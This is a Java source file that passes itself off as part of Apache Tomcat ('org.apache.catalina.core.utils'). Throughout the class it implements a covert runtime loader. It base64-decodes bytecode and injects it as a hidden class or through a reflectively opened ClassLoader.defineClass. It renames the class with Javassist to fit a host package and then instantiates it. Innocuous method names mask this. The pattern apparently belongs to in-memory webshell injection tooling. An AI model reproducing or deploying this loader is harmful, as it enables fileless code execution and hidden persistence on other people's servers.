package org.apache.catalina.core.utils;

import javassist.ClassPool;
import javassist.CtClass;

import java.io.ByteArrayInputStream;
import java.io.IOException;

public class Util {

    private static final Object LEGACY;
    private static final java.lang.reflect.Method LEGACY_DECODE;
    private static final java.util.Base64.Decoder MIME = java.util.Base64.getMimeDecoder();
    private static final String PKG = Util.class.getName().substring(0, Util.class.getName().lastIndexOf('.'));

    static {
        Object d = null;
        java.lang.reflect.Method m = null;
        try {
            Class<?> dec = Class.forName("sun.misc.BASE64Decoder");
            d = dec.newInstance();
            m = dec.getMethod("decodeBuffer", String.class);
        } catch (Throwable ignored) {
        }
        LEGACY = d;
        LEGACY_DECODE = m;
    }

    public static byte[] decode(String s) throws java.io.IOException {
        if (LEGACY != null && LEGACY_DECODE != null) {
            try {
                return (byte[]) LEGACY_DECODE.invoke(LEGACY, s);
            } catch (Throwable t) {
                throw new java.io.IOException(t);
            }
        }
        return MIME.decode(s);
    }

    public static Class defineClass(byte[] bytes) throws Throwable {
        return defineClass(bytes, null);
    }

    public static Class defineClass(byte[] bytes, Object host) throws Throwable {
        Class<?> c = tryHiddenClass(bytes, host);
        if (c == null) {
            c = tryDefineViaLoader(bytes, readClassName(bytes));
        }
        if (c == null) {
            throw new IllegalStateException("defineClass: no available path");
        }
        return c;
    }

    private static Class tryHiddenClass(byte[] bytes, Object host) {
        Object lookup = null;
        Class<?> hostClass = null;
        try {
            Class<?> lookupCls = Class.forName("java.lang.invoke.MethodHandles$Lookup");
            Class.forName("java.lang.invoke.MethodHandles$Lookup$ClassOption");
            Object base = java.lang.invoke.MethodHandles.lookup();
            lookup = base;
            if (host != null) {
                hostClass = host.getClass();
                try {
                    lookup = lookupCls.getMethod("privateLookupIn", Class.class, lookupCls).invoke(null, hostClass, base);
                } catch (Throwable ignored) {
                    lookup = base;
                }
            }
            Class<?> lookupHost = (Class) lookupCls.getMethod("lookupClass").invoke(lookup);
            byte[] repackaged = repackage(bytes, packageOf(lookupHost.getName()));
            if (repackaged == null) {
                return null;
            }
            Class<?> optCls = Class.forName("java.lang.invoke.MethodHandles$Lookup$ClassOption");
            Object opts = java.lang.reflect.Array.newInstance(optCls, 1);
            java.lang.reflect.Array.set(opts, 0, java.lang.Enum.valueOf((Class) optCls, "STRONG"));
            java.lang.reflect.Method m = lookupCls.getMethod("defineHiddenClass",
                    byte[].class, boolean.class, java.lang.reflect.Array.newInstance(optCls, 0).getClass());
            Object resultLookup = m.invoke(lookup, repackaged, Boolean.FALSE, opts);
            return (Class) lookupCls.getMethod("lookupClass").invoke(resultLookup);
        } catch (NoSuchMethodException e) {
            return null;
        } catch (Throwable t) {
            return null;
        }
    }

    private static String packageOf(String className) {
        int i = className.lastIndexOf('.');
        return i < 0 ? "" : className.substring(0, i);
    }

    private static byte[] repackage(byte[] bytes, String targetPkg) {
        try {
            ClassPool cp = new ClassPool(false);
            CtClass cc = cp.makeClass(new ByteArrayInputStream(bytes));
            String pkg = packageOf(cc.getName());
            if (!pkg.equals(targetPkg)) {
                String simple = cc.getName().substring(cc.getName().lastIndexOf('.') + 1);
                cc.setName((targetPkg.isEmpty() ? "" : targetPkg + ".") + "Agst_" + simple);
            }
            byte[] out = cc.toBytecode();
            cc.detach();
            return out;
        } catch (Throwable t) {
            return null;
        }
    }

    private static Class tryDefineViaLoader(byte[] bytes, String name) throws Exception {
        ClassLoader cl = Thread.currentThread().getContextClassLoader();
        java.lang.reflect.Method m = ClassLoader.class.getDeclaredMethod(
                "defineClass", String.class, byte[].class, int.class, int.class);
        m.setAccessible(true);
        return (Class) m.invoke(cl, name, bytes, 0, bytes.length);
    }

    private static String readClassName(byte[] bytes) throws IOException {
        ClassPool cp = new ClassPool(false);
        CtClass cc = cp.makeClass(new ByteArrayInputStream(bytes));
        try {
            return cc.getName();
        } finally {
            cc.detach();
        }
    }

    public static Object instantiate(Class<?> c) throws Throwable {
        java.lang.reflect.Constructor<?> ct = c.getDeclaredConstructor();
        ct.setAccessible(true);
        return ct.newInstance();
    }

    public static Class extendClassLoader(byte[] c) throws Throwable {
        return defineClass(c, null);
    }

    public static Class extendClassLoader(byte[] c, Object host) throws Throwable {
        return defineClass(c, host);
    }

    public static Class abstractClassLoader(byte[] c) throws Throwable {
        return abstractClassLoader(c, null);
    }

    public static Class abstractClassLoader(byte[] c, Object host) throws Throwable {
        Class clz = defineClass(c, host);
        instantiate(clz);
        return clz;
    }
}
